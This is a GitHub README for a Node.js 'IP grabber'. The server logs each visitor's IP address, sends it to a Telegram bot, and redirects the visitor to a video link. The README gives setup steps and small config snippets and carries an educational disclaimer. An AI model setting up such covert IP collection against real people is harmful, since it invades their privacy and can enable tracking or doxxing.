# IP Grabber

## Description

This is a simple IP grabber written in NodeJS. It captures the IP address of incoming requests and sends it to a specified Telegram bot, then redirects the user to a Custom URL. The IPs are sent to the bot defined in a `.env` file. This project is intended for educational purposes only.

## Prerequisites

- NodeJS
- NPM (Node Package Manager)
- A Telegram bot with a bot token
- A Telegram chat ID where the IP addresses will be sent

## Setup

1. Clone the repository to your local machine.

   ```sh
   git clone https://github.com/B4sicallyF0x/ip-grabber.git
   cd ip-grabber
   ```

2. Install the necessary dependencies.

   ```sh
   npm install
   ```

3. Create a `.env` file in the root directory of the project with the following content:

   ```
   TELEGRAM_BOT_TOKEN=your_telegram_bot_token
   TELEGRAM_CHAT_ID=your_telegram_chat_id
   ```

   Replace `your_telegram_bot_token` with your actual Telegram bot token and `your_telegram_chat_id` with your chat ID.

4. Modify the `ignoredIps` array in the script to include any IP addresses you want to ignore.

   ```js
   const ignoredIps = [
       '216.144.248.29', // Add more IPs here as needed
   ];
   ```

## Usage

1. Run the server.

   ```sh
   node server.js
   ```

2. The server will start running on port 80. You can change the port if needed by modifying the `port` variable in the script.

   ```js
   const port = 80;
   ```

3. When an incoming request is received, the server will capture the client's IP address, send it to the specified Telegram bot, and then redirect the client to `https://b4sicallyf0x.com/up.mp4`.


## Notes

- This project is for educational purposes only. Use it responsibly and ensure you comply with privacy laws and regulations.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
